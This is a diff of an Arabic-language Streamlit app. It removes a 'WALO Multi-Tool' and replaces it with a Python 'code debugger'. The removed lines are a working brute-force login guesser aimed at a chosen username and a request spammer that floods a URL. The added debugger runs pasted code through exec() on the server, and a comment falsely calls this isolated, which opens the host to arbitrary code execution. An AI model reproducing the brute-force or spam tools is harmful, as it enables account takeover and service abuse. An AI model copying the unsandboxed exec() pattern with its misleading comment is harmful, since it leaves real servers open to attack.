@@ -1,92 +1,71 @@
 import streamlit as st
-import requests
-import time
+import ast
+import traceback
+import sys
+from io import StringIO
 
-# إعدادات الصفحة الفخمة لحساب WALO
-st.set_page_config(page_title="WALO Multi-Tool & Automator", page_icon="⚡", layout="centered")
+# إعدادات واجهة محلل الأكواد
+st.set_page_config(page_title="WALO Code Debugger", page_icon="💻", layout="centered")
 
-st.title("⚡ سكربت WALO الذكي للتحكم والأتمتة")
-st.write("أداة مخصصة للتخمين، فحص الحسابات، وإرسال الطلبات التلقائية بلمحة بصر")
+st.title("💻 محلل ومصحح الأكواد من WALO")
+st.write("الِصق سكربت البايثون هنا عشان نفحصه، ونقشّع الأخطاء البرمجية ونعلمك كيف تصلحها")
 st.markdown("---")
 
-# القائمة الجانبية لاختيار الأداة
-option = st.sidebar.selectbox("اختر الأداة اللي تبي تشغلها:", ["أداة التخمين (Brute Force)", "مستخرج المعرفات (ID Extractor)", "أتمتة الحسابات (Automation)"])
+# خانة كتابة أو لصق كود بايثون
+code_input = st.text_area("أدخل كود بايثون (Python Code) هنا للفحص:", height=300, placeholder="print('Hello' -> مثال لخطأ سينتكس")
 
-if option == "أداة التخمين (Brute Force)":
-    st.subheader("🕵️‍♂️ نظام التخمين وفحص الحسابات")
-    target_api = st.text_input("أدخل رابط تسجيل الدخول (API Endpoint):", "https://example.com/api/login")
-    user_input = st.text_input("اسم المستخدم المستهدف (Username):")
-    pass_list = st.text_area("أدخل قائمة كلمات المرور (كلمة في كل سطر):", "123456\npassword\nadmin123")
-    
-    if st.button("ابدأ التخمين والخرش 🚀", use_container_width=True):
-        if not user_input or not target_api:
-            st.warning("يا واد حط الرابط واسم المستخدم أول شي!")
-        else:
-            passwords = pass_list.split("\n")
-            st.info(f"جاري فحص قائمة الكلمات ضد الحساب: {user_input}...")
+if st.button("افحص السكربت وقفط الأخطاء 🚀", use_container_width=True):
+    if not code_input.strip():
+        st.warning("يا واد حط كود بايثون أول شي عشان نفحصه!")
+    else:
+        st.info("جاري تحليل الكود وفحص السنتكس والتركيب البرمجي...")
+        
+        # المرحلة الأولى: فحص الأخطاء الإملائية والتركيبية (Syntax Check)
+        try:
+            ast.parse(code_input)
+            st.success("✅ فحص التركيب (Syntax): كودك سليم إملائياً وما فيه أخطاء قفل أقواس أو علامات ناقصة!")
             
-            progress_bar = st.progress(0)
-            for index, password in enumerate(passwords):
-                password = password.strip()
-                if not password:
-                    continue
+            # المرحلة الثانية: تجربة تشغيل افتراضية لقنص أخطاء التشغيل (Runtime Errors)
+            st.info("جاري محاكاة تشغيل الكود لقفط أخطاء التشغيل...")
+            
+            # تحويل المخرجات للتيرمينال الوهمي عشان ما يخرب الموقع
+            old_stdout = sys.stdout
+            redirected_output = sys.stdout = StringIO()
+            
+            try:
+                # تشغيل الكود في بيئة معزولة ونظيفة
+                local_vars = {}
+                exec(code_input, {}, local_vars)
+                sys.stdout = old_stdout # إعادة المخرجات لطبيعتها
                 
-                # إرسال طلب التخمين (تقدر تعدل البيانات حسب الموقع المستهدف)
-                payload = {"username": user_input, "password": password}
-                try:
-                    response = requests.post(target_api, data=payload, timeout=5)
+                st.success("🔥 كفو! الكود اشتغل بالكامل بدون أي خطأ في التشغيل (Runtime Error).")
+                if redirected_output.getvalue():
+                    st.subheader("📺 مخرجات تشغيل الكود (Output):")
+                    st.code(redirected_output.getvalue(), language="python")
                     
-                    # هنا نفحص استجابة السيرفر لو نجح الدخول
-                    if response.status_code == 200 and "success" in response.text.lower():
-                        st.success(f"🎉 قفطنا الباسورد الصح: {password}")
-                        break
-                    else:
-                        st.text(f"❌ تجربة فاشلة للباسورد: {password}")
-                except Exception as e:
-                    st.error(f"خطأ في الاتصال: {e}")
+            except Exception as e:
+                sys.stdout = old_stdout # إعادة المخرجات لطبيعتها
+                st.error("🚨 قفطنا خطأ أثناء تشغيل الكود (Runtime Error)! ")
                 
-                # تحديث شريط التقدم
-                progress_bar.progress((index + 1) / len(passwords))
-            else:
-                st.warning("انتهت القائمة ومحد لقط الباسورد الصح، جرب لستة ثانية.")
-
-elif option == "مستخرج المعرفات (ID Extractor)":
-    st.subheader("📊 مستخرج بيانات الحسابات والمعرفات")
-    json_data = st.text_area("الِصق استجابة الـ JSON هنا لاستخراج الـ IDs واليوزرات:")
-    
-    if st.button("استخراج البيانات فورا 🔎", use_container_width=True):
-        if not json_data:
-            st.warning("حط كود الـ JSON عشان نقفطه لك!")
-        else:
-            # سكربت سريع لتنظيف واستخراج المعرفات
-            import re
-            ids = re.findall(r'"id":\s*"?(\d+)"?', json_data)
-            usernames = re.findall(r'"username":\s*"([^"]+)"', json_data)
+                # استخراج تفاصيل الخطأ ومكانه
+                exc_type, exc_value, exc_tb = sys.exc_info()
+                error_details = traceback.format_exception(exc_type, exc_value, exc_tb)
+                
+                # عرض الخطأ بشكل مبسط
+                st.markdown(f"**نوع الخطأ:** `{exc_type.__name__}`")
+                st.markdown(f"**رسالة الخطأ:** {exc_value}")
+                
+                st.subheader("🔍 مكان المشكلة بالتفصيل:")
+                st.code("".join(error_details[-2:]), language="python")
+                st.caption("💡 نصيحة: تأكد من تعريف المتغيرات، أو استدعاء المكتبات الصح فوق، أو صحة العمليات الحسابية.")
+                
+        except SyntaxError as se:
+            st.error("❌ قفطنا خطأ مصنعي في كتابة الكود (Syntax Error)!")
+            st.markdown(f"**السبب:** `{se.msg}`")
+            st.markdown(f"**رقم السطر اللي فيه البلا:** سطر رقم `{se.lineno}`")
             
-            if ids or usernames:
-                st.success(f"لقطنا {len(ids)} معرف و {len(usernames)} اسم مستخدم!")
-                st.write("🆔 **المعرفات المستخرجة:**", ids)
-                st.write("👤 **اليوزرات المستخرجة:**", usernames)
-            else:
-                st.error("ما لقينا أي بيانات مطابقة في النص اللي حطيته.")
-
-elif option == "أتمتة الحسابات (Automation)":
-    st.subheader("🤖 سكربت الإرسال التلقائي (Spammer / Automator)")
-    target_spam = st.text_input("رابط إرسال الطلبات / الرسائل:")
-    spam_msg = st.text_input("النص أو البيانات المراد إرسالها بكثرة:")
-    count = st.number_input("عدد مرات الإرسال الدبل:", min_value=1, max_value=100, value=10)
-    
-    if st.button("اضرب وافرز الطلبات 💣", use_container_width=True):
-        if not target_spam:
-            st.warning("وين الرابط يا بعدي؟ حطه أول!")
-        else:
-            st.info("جاري بدء الأتمتة وضخ الطلبات الحين...")
-            for i in range(int(count)):
-                try:
-                    res = requests.post(target_spam, data={"data": spam_msg}, timeout=5)
-                    st.text(f"📥 طلب رقم {i+1} تم إرساله بنجاح. كود الحالة: {res.status_code}")
-                    time.sleep(0.5) # وقت مستقطع عشان ما ينصك السكربت باند
-                except:
-                    st.error(f"فشل إرسال الطلب رقم {i+1}")
-            st.success("قفلنا الأتمتة والطلبات كلها راحت سلام سلام!")
-
+            # عرض السطر المخرب
+            if se.text:
+                st.subheader("📍 السطر المسبب للمشكلة:")
+                st.code(f"{se.text.strip()}", language="python")
+                st.caption("💡 نصيحة: شيك على الأقواس، أو النقطتين الرأسية `:`، أو علامات التنصيص ناقصة في هذا السطر.")
